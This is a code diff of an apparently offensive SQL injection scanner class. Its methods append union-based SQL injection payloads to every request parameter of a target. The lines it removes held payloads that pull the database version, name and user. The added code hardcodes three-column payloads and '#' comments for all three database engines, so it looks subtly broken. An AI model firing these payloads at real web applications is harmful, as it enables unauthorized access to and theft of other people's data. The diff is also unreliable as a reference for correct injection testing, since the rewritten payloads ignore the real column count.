@@ -85,138 +85,129 @@ class UnionBasedInjector:
         """Test for MySQL union-based SQL injection."""
         results = []
         
-        if not self.column_count or not self.vulnerable_columns:
-            return results
-            
+        # Get all parameters from the request
+        params = self.request_engine.get_parameters()
+        
         # Common MySQL union-based payloads
         payloads = [
-            f"' UNION SELECT {','.join(['NULL'] * self.column_count)} --",
-            f"' UNION ALL SELECT {','.join(['NULL'] * self.column_count)} --",
-            f"' UNION SELECT {','.join(['NULL'] * self.column_count)} #",
-            f"' UNION ALL SELECT {','.join(['NULL'] * self.column_count)} #"
+            "' UNION SELECT 1,2,3 --",
+            "' UNION SELECT 1,2,3 #",
+            "' UNION ALL SELECT 1,2,3 --",
+            "' UNION ALL SELECT 1,2,3 #",
+            "' UNION SELECT NULL,NULL,NULL --",
+            "' UNION SELECT NULL,NULL,NULL #",
+            "' UNION ALL SELECT NULL,NULL,NULL --",
+            "' UNION ALL SELECT NULL,NULL,NULL #"
         ]
         
-        # Add payloads with database information
-        if len(self.vulnerable_columns) >= 2:
-            db_info_payloads = [
-                f"' UNION SELECT version(),database(),user(),{','.join(['NULL'] * (self.column_count - 3))} --",
-                f"' UNION ALL SELECT version(),database(),user(),{','.join(['NULL'] * (self.column_count - 3))} --",
-                f"' UNION SELECT version(),database(),user(),{','.join(['NULL'] * (self.column_count - 3))} #",
-                f"' UNION ALL SELECT version(),database(),user(),{','.join(['NULL'] * (self.column_count - 3))} #"
-            ]
-            payloads.extend(db_info_payloads)
-            
-        for payload in payloads:
-            try:
-                # Send request with payload
-                response, _ = self.request_engine.send_request(payload=payload)
-                
-                # Check if response indicates successful injection
-                if self._check_union_success(response):
-                    results.append({
-                        "type": "mysql_union_based",
-                        "payload": payload,
-                        "status": "vulnerable",
-                        "columns": self.vulnerable_columns,
-                        "data": self._extract_union_data(response)
-                    })
+        for param_name, param_value in params.items():
+            for payload in payloads:
+                try:
+                    # Send request with payload
+                    test_value = param_value + payload if param_value else payload
+                    response, _ = self.request_engine.send_request(params={param_name: test_value})
                     
-            except Exception as e:
-                logging.error(f"Error testing MySQL union-based injection: {str(e)}")
-                continue
-                
+                    # Check if response indicates successful injection
+                    if self._check_union_success(response):
+                        results.append({
+                            "type": "union",
+                            "parameter": param_name,
+                            "payload": payload,
+                            "status": "vulnerable",
+                            "columns": self.vulnerable_columns,
+                            "data": self._extract_union_data(response)
+                        })
+                        
+                except Exception as e:
+                    logging.error(f"Error testing MySQL union-based injection: {str(e)}")
+                    continue
+                    
         return results
         
     def _test_postgres_union(self) -> List[Dict[str, Any]]:
         """Test for PostgreSQL union-based SQL injection."""
         results = []
         
-        if not self.column_count or not self.vulnerable_columns:
-            return results
-            
+        # Get all parameters from the request
+        params = self.request_engine.get_parameters()
+        
         # Common PostgreSQL union-based payloads
         payloads = [
-            f"' UNION SELECT {','.join(['NULL'] * self.column_count)} --",
-            f"' UNION ALL SELECT {','.join(['NULL'] * self.column_count)} --",
-            f"' UNION SELECT {','.join(['NULL'] * self.column_count)} #",
-            f"' UNION ALL SELECT {','.join(['NULL'] * self.column_count)} #"
+            "' UNION SELECT 1,2,3 --",
+            "' UNION SELECT 1,2,3 #",
+            "' UNION ALL SELECT 1,2,3 --",
+            "' UNION ALL SELECT 1,2,3 #",
+            "' UNION SELECT NULL,NULL,NULL --",
+            "' UNION SELECT NULL,NULL,NULL #",
+            "' UNION ALL SELECT NULL,NULL,NULL --",
+            "' UNION ALL SELECT NULL,NULL,NULL #"
         ]
         
-        # Add payloads with database information
-        if len(self.vulnerable_columns) >= 2:
-            db_info_payloads = [
-                f"' UNION SELECT version(),current_database(),current_user,{','.join(['NULL'] * (self.column_count - 3))} --",
-                f"' UNION ALL SELECT version(),current_database(),current_user,{','.join(['NULL'] * (self.column_count - 3))} --",
-                f"' UNION SELECT version(),current_database(),current_user,{','.join(['NULL'] * (self.column_count - 3))} #",
-                f"' UNION ALL SELECT version(),current_database(),current_user,{','.join(['NULL'] * (self.column_count - 3))} #"
-            ]
-            payloads.extend(db_info_payloads)
-            
-        for payload in payloads:
-            try:
-                # Send request with payload
-                response, _ = self.request_engine.send_request(payload=payload)
-                
-                # Check if response indicates successful injection
-                if self._check_union_success(response):
-                    results.append({
-                        "type": "postgres_union_based",
-                        "payload": payload,
-                        "status": "vulnerable",
-                        "columns": self.vulnerable_columns,
-                        "data": self._extract_union_data(response)
-                    })
+        for param_name, param_value in params.items():
+            for payload in payloads:
+                try:
+                    # Send request with payload
+                    test_value = param_value + payload if param_value else payload
+                    response, _ = self.request_engine.send_request(params={param_name: test_value})
                     
-            except Exception as e:
-                logging.error(f"Error testing PostgreSQL union-based injection: {str(e)}")
-                continue
-                
+                    # Check if response indicates successful injection
+                    if self._check_union_success(response):
+                        results.append({
+                            "type": "union",
+                            "parameter": param_name,
+                            "payload": payload,
+                            "status": "vulnerable",
+                            "columns": self.vulnerable_columns,
+                            "data": self._extract_union_data(response)
+                        })
+                        
+                except Exception as e:
+                    logging.error(f"Error testing PostgreSQL union-based injection: {str(e)}")
+                    continue
+                    
         return results
         
     def _test_mssql_union(self) -> List[Dict[str, Any]]:
         """Test for MSSQL union-based SQL injection."""
         results = []
         
-        if not self.column_count or not self.vulnerable_columns:
-            return results
-            
+        # Get all parameters from the request
+        params = self.request_engine.get_parameters()
+        
         # Common MSSQL union-based payloads
         payloads = [
-            f"' UNION SELECT {','.join(['NULL'] * self.column_count)} --",
-            f"' UNION ALL SELECT {','.join(['NULL'] * self.column_count)} --",
-            f"' UNION SELECT {','.join(['NULL'] * self.column_count)} #",
-            f"' UNION ALL SELECT {','.join(['NULL'] * self.column_count)} #"
+            "' UNION SELECT 1,2,3 --",
+            "' UNION SELECT 1,2,3 #",
+            "' UNION ALL SELECT 1,2,3 --",
+            "' UNION ALL SELECT 1,2,3 #",
+            "' UNION SELECT NULL,NULL,NULL --",
+            "' UNION SELECT NULL,NULL,NULL #",
+            "' UNION ALL SELECT NULL,NULL,NULL --",
+            "' UNION ALL SELECT NULL,NULL,NULL #"
         ]
         
-        # Add payloads with database information
-        if len(self.vulnerable_columns) >= 2:
-            db_info_payloads = [
-                f"' UNION SELECT @@version,db_name(),system_user,{','.join(['NULL'] * (self.column_count - 3))} --",
-                f"' UNION ALL SELECT @@version,db_name(),system_user,{','.join(['NULL'] * (self.column_count - 3))} --",
-                f"' UNION SELECT @@version,db_name(),system_user,{','.join(['NULL'] * (self.column_count - 3))} #",
-                f"' UNION ALL SELECT @@version,db_name(),system_user,{','.join(['NULL'] * (self.column_count - 3))} #"
-            ]
-            payloads.extend(db_info_payloads)
-            
-        for payload in payloads:
-            try:
-                # Send request with payload
-                response, _ = self.request_engine.send_request(payload=payload)
-                
-                # Check if response indicates successful injection
-                if self._check_union_success(response):
-                    results.append({
-                        "type": "mssql_union_based",
-                        "payload": payload,
-                        "status": "vulnerable",
-                        "columns": self.vulnerable_columns,
-                        "data": self._extract_union_data(response)
-                    })
+        for param_name, param_value in params.items():
+            for payload in payloads:
+                try:
+                    # Send request with payload
+                    test_value = param_value + payload if param_value else payload
+                    response, _ = self.request_engine.send_request(params={param_name: test_value})
                     
-            except Exception as e:
-                logging.error(f"Error testing MSSQL union-based injection: {str(e)}")
-                continue
-                
+                    # Check if response indicates successful injection
+                    if self._check_union_success(response):
+                        results.append({
+                            "type": "union",
+                            "parameter": param_name,
+                            "payload": payload,
+                            "status": "vulnerable",
+                            "columns": self.vulnerable_columns,
+                            "data": self._extract_union_data(response)
+                        })
+                        
+                except Exception as e:
+                    logging.error(f"Error testing MSSQL union-based injection: {str(e)}")
+                    continue
+                    
         return results
         
     def _check_error_response(self, response) -> bool:
